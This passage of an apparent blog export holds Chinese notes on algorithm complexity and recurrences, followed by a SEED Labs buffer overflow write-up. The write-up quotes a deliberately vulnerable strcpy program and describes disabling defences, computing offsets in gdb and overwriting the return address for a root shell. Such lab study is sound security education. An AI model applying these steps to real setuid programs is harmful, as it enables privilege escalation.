<li>$f_1 = O(g_1) ∧ f_2 = O(g_2) ⇒ f_1 + f_2 = O(max(g_1, g_2))$</li>
<li>This implies $f_1 = O(g) ∧ f_2 = O(g) ⇒ f_1 + f_2 ∈ O(g)$, which means that O(g) is a convex cone.</li>
<li>应用：对于一个算法，如果算法每一步的上界由$h(n)$确定，那么如果这个算法只包含有限步，那么总的时间复杂度是$O(h(n))$</li>
</ul>
<p>凸锥(convex cone):$x_1,x_2\in C⇒ x=\theta_1x_1+\theta_2x_2\in C,\forall\theta_1,\theta_2\ge0$</p>
<p>由一个常数的乘法，定义$k&gt;0$是一个常数，那么：</p>
<p>$O(kg)=O(g)$,if $k\ne0$</p>
<p>$f=O(g)⇒ kf=O(g)$</p>
<h3 id="4-Important-Function-Classes"><a href="#4-Important-Function-Classes" class="headerlink" title="4.Important Function Classes"></a>4.Important Function Classes</h3><p>下面是几个课堂中需要知道的重要函数</p>
<ul>
<li><p>constant:$O(1)$</p>
</li>
<li><p>double logarithmic(双对数函数):$loglogn$</p>
</li>
<li><p>logarithmic:$logn$</p>
</li>
<li><p>polylogarithmic:$(logn)^c,c&gt;1$</p>
</li>
<li><p>fractional power:$n^c,0&lt;c&lt;1$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112161726359.png" alt="image-20230112161726359"></p>
</li>
<li><p>linear:$O(n)$</p>
</li>
<li>loglinear or quasilinear:$n\log n$</li>
<li>polynomial:$n^c,c&gt;1$(quadratic二次的，cubic三次的)</li>
<li>exponential:$c^n,c&gt;1$</li>
<li>factorial:$n!$</li>
</ul>
<p><strong>一些常见函数的渐近阶</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112162509463.png" alt="image-20230112162509463"></p>
<p>这里是一个多项式函数，证明是将多项式函数比上渐进的上界，如果是常数，那么就是说明两个函数的阶基本上一致，也就是可用$\Theta$来表示</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112162817723.png" alt="image-20230112162817723"></p>
<p>这里也就是不同底的对数 函数阶相等，但是一定小于多项式的阶数，下面比较的证明是通过洛必达法则来进行的，通过两个函数比值在无穷大的时候等于0，可以看出对数函数是多项式函数的高阶无穷小.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112163216706.png" alt="image-20230112163216706"></p>
<p>这里是多项式函数和指数函数的比较，这里还是用洛必达法则，可以看出多项式函数是指数函数的高阶无穷小</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112163604125.png" alt="image-20230112163604125"></p>
<p>这里使用斯特林公式对$n!$进行了一些化简，由上面的公式可以直接得出第一条，使用斯特林公式的简化形式可以得到第2和第三条</p>
<p>那么这里第三条也可以使用integral积分来证明</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112164057357.png" alt="image-20230112164057357"></p>
<p>这里积分的技巧是让函数包含在积分区间之中</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112164150790.png" alt="image-20230112164150790"></p>
<p>那么可以回到投资转化率问题上，那么这里的组合数公式通过斯特林公式简化以后可以看到是一个指数级别的形式</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112164305030.png" alt="image-20230112164305030"></p>
<p><strong>Rounding Founction</strong></p>
<p>这里的函数就是上取整函数和下取整函数，这里的一个应用是使用二分查找时区间的范围</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112164512030.png" alt="image-20230112164512030"></p>
<p>下面是对于取整函数的一些性质，这里值得注意的一点是证明的方法一般<font color='red'>是将x取在某两个数之间，然后带入进行求解</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112164512030.png" alt=""></p>
<p>ps:这里字体颜色通过<strong>\<font color=''>\</font></strong></p>
<p>来设置</p>
<p>那么显然我们要尽量将算法运行效率降低，下面是对于算法效率分布的图</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112164934651.png" alt="image-20230112164934651"></p>
<h3 id="5-Survey-of-Common-Running-Times"><a href="#5-Survey-of-Common-Running-Times" class="headerlink" title="5.Survey of Common Running Times"></a>5.Survey of Common Running Times</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112204215873.png" alt="image-20230112204215873"></p>
<p>这里的Linear线性时间就是Merge Sort的一次合并过程，这里上界就是两个有序数组相互比较，这样就需要2n-1次比较，下界就是两个数组本来就是有序关系，这样就比较n次</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112204515275.png" alt="image-20230112204515275"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112204639349.png" alt="image-20230112204639349"></p>
<p><font color='red'>Remark.</font>$Ω(n^2)$ seems inevitable(不可避免的), but this is just an illusion(幻觉).</p>
<p>立方的cubic time：两个矩阵相乘</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112205105089.png" alt="image-20230112205105089"></p>
<p>下面介绍了可取的放缩特性，当你输入规模加倍时，算法只减慢某个常数因子c.当一个算法是一个多项式时间时，我们说这个算法是效率高的.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112205608161.png" alt="image-20230112205608161"></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Design and Analysis of Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Design and Analysis of Algorithms3</title>
    <url>/2023/01/12/algorithm3/</url>
    <content><![CDATA[<h1 id="lectrue4"><a href="#lectrue4" class="headerlink" title="lectrue4"></a>lectrue4</h1><h3 id="1-Sequences-and-Series-Summion"><a href="#1-Sequences-and-Series-Summion" class="headerlink" title="1.Sequences and Series Summion"></a>1.Sequences and Series Summion</h3><p>​    这一部分是复习序列和序列求和的相关知识</p>
<p><strong>Mathematics of Algorithm Complexity</strong></p>
<p>​    这一部分关于算法复杂度的数学内容</p>
<p>算法通常由循环和迭代结构来组成</p>
<ul>
<li>复杂性需要进行数列或者级数的求和</li>
</ul>
<p>一些序列求和计算的方法</p>
<ul>
<li>通项公式(general term formula)会得到一个准确的结果</li>
<li>估算和的上下界会得到一个估约结果</li>
</ul>
<p>算法也许会包含递归的结构</p>
<ul>
<li>复杂度就和递推关系有关</li>
</ul>
<p>解决递归问题的方法</p>
<ul>
<li>递归关系简单：直接迭代+做替代后迭代</li>
<li>递归关系复杂：化简+递归树</li>
<li>通用：主定理</li>
</ul>
<p>下面是算数序列的求和，这个也是等差数列</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112211317523.png" alt="image-20230112211317523"></p>
<p>下面是几何序列的求和，也就是等比数列的求和，可以使用错位相减</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112211427153.png" alt="image-20230112211427153"></p>
<p>下面是调和级数的求和这里使用微积分方法来解决</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112211556072.png" alt="image-20230112211556072"></p>
<p>这些序列的一些性质，可以求两个数的中项</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112212145632.png" alt="image-20230112212145632"></p>
<p>这是一个使用替代方法求序列和的例子。这里将$2^{i-1}$进行拆项以后化简</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112214732508.png" alt="image-20230112214732508"></p>
<p>Amplification（扩增） method，这里使用了两种方所的方法，第一种将$a_i$统一到最大的$a_i$,第二种方法使用相邻两项之间的关系进行放缩</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112214951383.png" alt="image-20230112214951383"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112215043565.png" alt="image-20230112215043565"></p>
<p><strong>Binary Search Algorithm</strong></p>
<p>二分查找我们都知道是在$O(\log n)$时间内查找元素的算法</p>
<p>Ideal case.$n=2^k-1$</p>
<p>为什么是ideal的因为子问题的规模始终在$2^i-1$</p>
<p>这里我们让$n=2^k-1$,假设x出现在每个位置的可能性相同，也就是出现在目标位置和空隙中的几率相等</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112222327908.png" alt="image-20230112222327908"></p>
<p>下面是n，k和查找次数t的关系</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230112222946285.png" alt="image-20230112222946285"></p>
<h3 id="2-Rucurrence-Relation-and-Algorithm-Analysis"><a href="#2-Rucurrence-Relation-and-Algorithm-Analysis" class="headerlink" title="2.Rucurrence Relation and Algorithm Analysis"></a>2.Rucurrence Relation and Algorithm Analysis</h3><h4 id="2-1-Approach-1-Direct-Iteration"><a href="#2-1-Approach-1-Direct-Iteration" class="headerlink" title="2.1 Approach 1: Direct Iteration"></a>2.1 Approach 1: Direct Iteration</h4><p>当一个递归关系是简单的，$F(n)$只依赖$F(n-1)$,我们可以使用直接迭代。下面是汉诺塔的递归关系，汉诺塔是将A塔上的n个盘子挪到C盘，如果A盘上只有一个盘子那么就直接移动到C盘，如果A盘上不止一个盘子，那么步骤就是先将A盘上的n-1个盘子移动到B盘，然后再将最大的盘子移动到C，最后将B盘上n-1个盘子移动到C，下面是汉诺塔的伪代码和递归公式：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113112032277.png" alt="image-20230113112032277"></p>
<p>那么就可以使用迭代法来求解</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113112129930.png" alt="image-20230113112129930"></p>
<p><strong>插入排序</strong>：之前我们分析过插入排序的流程，下面进行时间复杂度的推导</p>
<p>最坏的情况下是数组逆序，那么解决n的数组排序就先要解决n-1的数组排序然后再加入n-1次插入的比较</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113112510451.png" alt="image-20230113112510451"></p>
<p>如果要证明之前的Proposition，就要使用Mathematical Induction的方法</p>
<ul>
<li><p>Basis:$n=1,W(1)=1\times(1-1)/2=0$</p>
</li>
<li><p>Induction step:$P(n)=1\rightarrow P(n+1)=1$:</p>
<script type="math/tex; mode=display">
W(n + 1) = W(n) + n\\
= n(n − 1)/2 + n //premise\\
= n((n − 1)/2 + 1) = n(n + 1)/2</script></li>
</ul>
<p>  当然这里要基于premise前提假设</p>
<p><strong>先替代再迭代</strong>：</p>
<ul>
<li>将递推方程公式中n变成关于k的递归方程</li>
<li>使用k进行迭代</li>
<li>将关于k的式子然后转化为n</li>
</ul>
<p>下面是一个mergesort的过程，这里在不使用主定理的情况下分母将难以处理，于是我们可以使用$2^k$来进行代替</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113113720088.png" alt="image-20230113113720088"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113113743422.png" alt="image-20230113113743422"></p>
<h4 id="2-2-Approach2：implification-then-Iteration"><a href="#2-2-Approach2：implification-then-Iteration" class="headerlink" title="2.2 Approach2：implification-then-Iteration"></a>2.2 Approach2：implification-then-Iteration</h4><p>一个例子是在使用quicksort的情况下，由于partition不同，子问题也不同，因此递归式很复杂</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113114016122.png" alt="image-20230113114016122"></p>
<p>这里第n个情况和前面所有的情况都有关系，那么就十分复杂，因此就需要进行化简，这里使用错位相减的方法进行你化简</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113114254965.png" alt="image-20230113114254965"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113114315391.png" alt="image-20230113114315391"></p>
<p>这里可以将红框的内容看作整体进行迭代</p>
<script type="math/tex; mode=display">
A(n)=A(n-1)+1/(n+1)\\=(1/(n+1)+1/n+...+1/3)+A(1)</script><h4 id="2-3-Approach-3-Recursion-Tree"><a href="#2-3-Approach-3-Recursion-Tree" class="headerlink" title="2.3 Approach 3:Recursion Tree"></a>2.3 Approach 3:Recursion Tree</h4><p>​    当$F(n)$依赖一些非连续的前面解，我们可以使用递归树来解决这个问题.</p>
<p>​    递归树的构建步骤</p>
<ul>
<li>在一开始，只有一个根节点$T(n)$</li>
<li>然后使用下面的结构逐步构建子树，直到最终情况下叶结点是初始化的值</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113163828735.png" alt="image-20230113163828735"></p>
<p>下面是按照公式构建递归树的过程，这里需要计算每一层的值，找到规律然后进行求和，还要注意不同的路径到初始化值的速度是不同的</p>
<ul>
<li>到达速度快的深度可以估计下界</li>
<li>到达速度慢的深度可以估计上界</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113164922195.png" alt="image-20230113164922195"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113164937826.png" alt="image-20230113164937826"></p>
<h3 id="3-Master-Theorem"><a href="#3-Master-Theorem" class="headerlink" title="3.Master Theorem"></a>3.Master Theorem</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113165728638.png" alt="image-20230113165728638"></p>
<p>上面是主定理的内容，具体的理解可以参照这篇文章</p>
<p><a href="https://blog.restkhz.com/post/how-master-theorem-works#:~:text=主定理%2C,简单的说就是用来快速计算存在递归的分治算法时间复杂度的一套公式.">深入浅出理解主定理原理(Master theorem)如何计算递归时间复杂度 | RESTKHZ</a></p>
<p>现在简单来解释一下，一个递归树，最终可以被分成两个部分，上面都是由$f(n)$构成的，而最下面的节点都是$O(1)$,那么$T(n)=p\cdot f(n)+k\cdot O(1)$,这里k就是$a^{log_{b}n}$，这里可以使用换底公式进行化简,也就是$n^{log_ba}$,然后$T(n)=p\cdot f(n)+n^{log_ba}$,主定理就是比较这两项对复杂度的贡献.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113171604116.png" alt="image-20230113171604116"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113171613088.png" alt="image-20230113171613088"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113171706482.png" alt="image-20230113171706482"></p>
<h3 id="4-主定理的应用"><a href="#4-主定理的应用" class="headerlink" title="4.主定理的应用"></a>4.主定理的应用</h3><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113171910000.png" alt="image-20230113171910000"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113172105838.png" alt="image-20230113172105838"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113174022712.png" alt="image-20230113174022712"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113174047047.png" alt="image-20230113174047047"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113174058911.png" alt="image-20230113174058911"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230113174113315.png" alt="image-20230113174113315"></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Design and Analysis of Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>seedlab(一)</title>
    <url>/2023/01/05/bufferoverflow/</url>
    <content><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><h3 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.实验目的"></a>1.实验目的</h3><p>​    缓冲区溢出定义为程序试图将数据写入缓冲区边界之外的情况。这一漏洞可以被恶意用户利用来改变程序的控制流，从而执行恶意代码。本实验需要理解并掌握以下主题：</p>
<ol>
<li><p>缓冲区溢出漏洞和攻击</p>
</li>
<li><p>堆栈布局</p>
</li>
<li><p>防御措施，包括地址随机话，不可执行栈以及StackGuard</p>
</li>
<li><p>Shellcode（32-bit and 64-bit）</p>
</li>
<li><p>Return-to-libc攻击，旨在绕过不可执行栈的防御措施</p>
</li>
</ol>
<h3 id="2-实验步骤"><a href="#2-实验步骤" class="headerlink" title="2.实验步骤"></a>2.实验步骤</h3><h4 id="2-1环境设置"><a href="#2-1环境设置" class="headerlink" title="2.1环境设置"></a>2.1环境设置</h4><p>为了简化攻击，我们需要将防御机制关闭并进行攻击</p>
<p>​    1.关闭地址空间布局随机化 猜测地址是缓冲区溢出攻击的关键步骤之一。Ubuntu 与其它几个基于 Linux 的操作系统使用地址空间随机化使堆和栈的起始地址随机化，使得攻击者很难猜测出确切的地址。</p>
<p>​    2.配置/bin/sh 在最新版的 Ubuntu 操作系统中，/bin/sh 符号链接指向/bin/dash shell。dash 程序和 bash 程序都实现了一种安全机制，可以防止自身在 Set-UID 进程中执行。我们将/bin/sh简单来说，如果检测到它们在 Set-UID 进程中执行，它们会立即将有效 user ID 切换为进程的真实 user ID，放弃特权。我们需要将/bin/sh链接到另一个没有安全机制的shell上。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105180752980.png" alt="image-20230105180752980" style="zoom:50%;" /></p>
<h4 id="2-2-Task-1：熟悉Shellcode"><a href="#2-2-Task-1：熟悉Shellcode" class="headerlink" title="2.2 Task 1：熟悉Shellcode"></a><strong>2.2 Task 1</strong>：熟悉Shellcode</h4><p>​    首先熟悉了Shellcode汇编代码，这里我们在shellcode文件夹下可以找到call_shellcode.c 程序。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105180904529.png" alt="image-20230105180904529" style="zoom:67%;" /></p>
<p>​    上面的代码包括了两个 shellcode 的副本，一个是 32-bit 另一个是 64-bit。当我们使用-m32 选项编 译程序时，将使用 32-bit 的版本；如果没有-m32 选项，将使用 64-bit 的版本。根据提供的 Makefile 文件，通过输入 make 命令来编译程序。这样将会生成两个二进制文件：a32.out (32-bit) 和 a64.out (64-bit)。（这里有可执行栈的选项，如果没有程序会失败）</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105181100048.png" alt="image-20230105181100048"></p>
<p>​    这里我们可以直接用gcc命令进行编译，也可以直接利用make命令，运行编译后的可执行文件，可以看到shell已经启动，/bin/sh链接的是zsh，并且在shell中能成功执行命令，说明缓冲区已经被重写。</p>
<h4 id="2-3-Task-2：理解漏洞程序"><a href="#2-3-Task-2：理解漏洞程序" class="headerlink" title="2.3 Task 2：理解漏洞程序"></a><strong>2.3 Task 2</strong>：理解漏洞程序</h4><p>​    本任务利用code文件夹中的stack.c程序，程序代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="number">2.</span>	<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="number">3.</span>	<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="number">4.</span>	  </span><br><span class="line"><span class="number">5.</span>	<span class="comment">/* Changing this size will change the layout of the stack. </span></span><br><span class="line"><span class="comment">6.	 * Instructors can change this value each year, so students </span></span><br><span class="line"><span class="comment">7.	 * won&#x27;t be able to use the solutions from the past. </span></span><br><span class="line"><span class="comment">8.	 */</span>  </span><br><span class="line"><span class="number">9.</span>	<span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE  </span></span><br><span class="line"><span class="number">10.</span>	<span class="meta">#<span class="keyword">define</span> BUF_SIZE 100  </span></span><br><span class="line"><span class="number">11.</span>	<span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line"><span class="number">12.</span>	  </span><br><span class="line"><span class="number">13.</span>	  </span><br><span class="line"><span class="number">14.</span>	<span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span>  </span><br><span class="line">15.	&#123;  </span><br><span class="line"><span class="number">16.</span>	    <span class="type">char</span> buffer[BUF_SIZE];  </span><br><span class="line"><span class="number">17.</span>	  </span><br><span class="line"><span class="number">18.</span>	    <span class="comment">// The following statement has a buffer overflow problem   </span></span><br><span class="line"><span class="number">19.</span>	    <span class="built_in">strcpy</span>(buffer, str);         </span><br><span class="line"><span class="number">20.</span>	  </span><br><span class="line"><span class="number">21.</span>	    <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"><span class="number">22.</span>	&#125;  </span><br><span class="line"><span class="number">23.</span>	  </span><br><span class="line"><span class="number">24.</span>	<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>  </span><br><span class="line">25.	&#123;  </span><br><span class="line"><span class="number">26.</span>	    <span class="type">char</span> str[<span class="number">517</span>];  </span><br><span class="line"><span class="number">27.</span>	    FILE *badfile;  </span><br><span class="line"><span class="number">28.</span>	    badfile = fopen(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;r&quot;</span>);  </span><br><span class="line"><span class="number">29.</span>	    fread(str,<span class="keyword">sizeof</span>(<span class="type">char</span>),<span class="number">517</span>,badfile);  </span><br><span class="line"><span class="number">30.</span>	    bof(str);  </span><br><span class="line"><span class="number">31.</span>	    <span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);  </span><br><span class="line"><span class="number">32.</span>	    <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line"><span class="number">33.</span>	&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上述程序存在缓冲区溢出漏洞。它首先从 badfile 文件中读取一个输入，然后将该输入传递给 函数 bof() 中的另一个缓冲区。原始输入的最大长度可以为 517 字节，但是 bof() 中的缓冲区只有 BUF_SIZE(100) 字节长，小于 517 字节。因为函数 strcpy() 不检查边界，所以会发生缓冲区溢出。由于 此程序是一个以 root 为所有者的 Set-UID 程序，如果普通用户可以利用该缓冲区溢出漏洞，普通用户可能会获得 root shell。</p>
<p>stack.c是需要使用的漏洞程序，基于利用缓冲区漏洞，在栈中执行代码以获取shell 的目的，因此，必须先关闭不可执行栈。还需要关闭溢出保护机制：  -fno-stack-protector       </p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192200068.png" alt="image-20230105192200068"></p>
<p>stack可执行文件的权限被更改。</p>
<h4 id="2-4-Task-3：对-32-bit-程序实施攻击-Level-1"><a href="#2-4-Task-3：对-32-bit-程序实施攻击-Level-1" class="headerlink" title="2.4 Task 3：对 32-bit 程序实施攻击 (Level 1)"></a><strong>2.4 Task 3</strong>：对 32-bit 程序实施攻击 (Level 1)</h4><p> <strong>2.4.1 研究探索</strong></p>
<p>  当gdb在函数bof()处停止，是在ebp寄存器被设置为指向当前栈帧之前停止，所以此时如果我们打印ebp的值，我们会获得调用者的ebp值。</p>
<p>​                             <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192257353.png" alt="image-20230105192257353" style="zoom:67%;" /></p>
<p>这里我们执行到断点，我们可以看到str的位置，str是从badfile中读出长度为517的字符串。</p>
<p> <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192316680.png" alt="image-20230105192316680" style="zoom:67%;" /></p>
<p>  继续执行，进入被调用函数，我们打印ebp寄存器和局部变量buffer的起始地址。</p>
<p><strong>2.4.2</strong> <strong>实施攻击</strong></p>
<p>  为了利用目标程序中的缓冲区溢出漏洞，我们需要构造一个payload，并将其保存在badfile文件中，这里我们使用一个python程序来做到这一点。</p>
<p>1.在shellcode位置填入32-bit版本的二进制代码。</p>
<p>2.修改start位置，即shellcode代码填写的位置，这里我们可以用buffer的首地址减去ebp的首地址查看buffer到ebp的字节数，由于我们插入了nop指令，我们只要把shellcode填入到eip之后的位置即可。这里我们可以插入到517长度的末尾。</p>
<p> <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192335050.png" alt="image-20230105192335050" style="zoom: 80%;" /></p>
<p>3.确定返回地址，我们需要将eip返回到恶意代码的位置，这里eip就是将ebp的位置+4即可(栈是由高地址向地址端增长的),由于eip后面被nop指令填充，这里返回地址只需填一个eip后面的地址即可。在尝试中，我们发现返回地址和恶意代码位置不应太远，否则会导致shell指令无法执行，需要注意的是，从gdb中获得的帧指针与程序实际执行时的值 (不使用 gdb) 有所不同。这是因为 gdb 在运行调试程序之前会将一些环境数据压入栈中。当程序直接运行而不使用 gdb 时，栈中没有这些数据，所以实际的帧指针的值会更大。（前面的环境配置不要忘记）</p>
<p>4.还有一点应该注意，ret地址不应该含有\x00否则会以前结束复制行为，导致缓冲区溢出失败。</p>
<p>5.可以使用bless命令查看badfile的填充情况，利用自带的python idle可以进行地址偏移计算和地址计算(是否含有\00)</p>
<p> <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192411853.png" alt="image-20230105192411853" style="zoom:80%;" /></p>
<p>​    下面是运行结果，可以看到我们已经获取的root shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192417300.png" alt="image-20230105192417300" style="zoom:50%;" /></p>
<h4 id="2-5-Task-4：在不知道缓冲区大小的情况下实施攻击-Level-2"><a href="#2-5-Task-4：在不知道缓冲区大小的情况下实施攻击-Level-2" class="headerlink" title="2.5 Task 4：在不知道缓冲区大小的情况下实施攻击 (Level 2)"></a><strong>2.5 Task 4</strong>：在不知道缓冲区大小的情况下实施攻击 (Level 2)</h4><p>​    这里我们不知道缓冲区的大小，只知道缓冲区大小的范围是100~200字节，一个很有用的结论是由于内存对齐，存储在帧指针中的值总是4的倍数。因此，我们可以从buffer头部位置后100~200字节，每4个字节填入返回指针的值，这样就保证eip寄存器能够被覆盖（注意地址要是4的倍数）。</p>
<p>​    而由于覆盖了一定空间，恶意代码存储的位置要尽量靠后，而且返回指针的值要避开覆盖区进入nop，因此要在buffer头部位置后偏移足够大的位移。（在gdb调试下buffer在栈中的深度大，调整位移时应适当扩大）</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192610195.png" alt="image-20230105192610195"></p>
<p>​    代码中0xffffc8d0是buffer的地址，0xffffc978是ebp的地址,这里我们使用ebp的地址，我们执行代码后可以发现已经获取root shell。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192623310.png" alt="image-20230105192623310"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192628500.png" alt="image-20230105192628500" style="zoom: 80%;" /></p>
<h4 id="2-6-Task-5：对64-bit程序实施攻击-Level-3"><a href="#2-6-Task-5：对64-bit程序实施攻击-Level-3" class="headerlink" title="2.6 Task 5：对64-bit程序实施攻击 (Level 3)"></a><strong>2.6 Task 5</strong>：对64-bit程序实施攻击 (Level 3)</h4><p>​    在本任务中，将对64bit的程序进行攻击，在这里帧指针寄存器的名字会有所不同，我们在gdb中，使用rbp来打印帧指针寄存器的值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192703430.png" alt="image-20230105192703430" style="zoom:67%;" /></p>
<p>​    这里注意64bit的程序采用的是8字节的地址，所以L应该设置成8，offset是在 rbp-buffer+8的位置，因为地址变为了8字节。</p>
<p>​    难点: 与对 32-bit 程序的缓冲区溢出攻击相比，对 64-bit 程序的攻击更难。最难的部分是地址。虽然 x64 体系结构支持 64-bit 地址空间，但是只允许使用 0x00∼0x00007FFFFFFFFFFF 范围内的地址。这意味着每个地址（8 个字节）的最高两个字节总是 0。在对地址进行赋值时，不应忘记高位的0，由于在计算机中是小端存储，所以00不会影响地址值的赋值。但是00后面的内容由于strcpy函数的性质不会被复制到栈上，这使得我们的恶意代码无法装入，解决这个问题，我们可以将恶意代码放在足够大的buffer中，也就是rip寄存器之前的位置(还是由于gdb栈会下沉，地址偏移应该稍大)。具体代码如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230105192736021.png" alt="image-20230105192736021"></p>
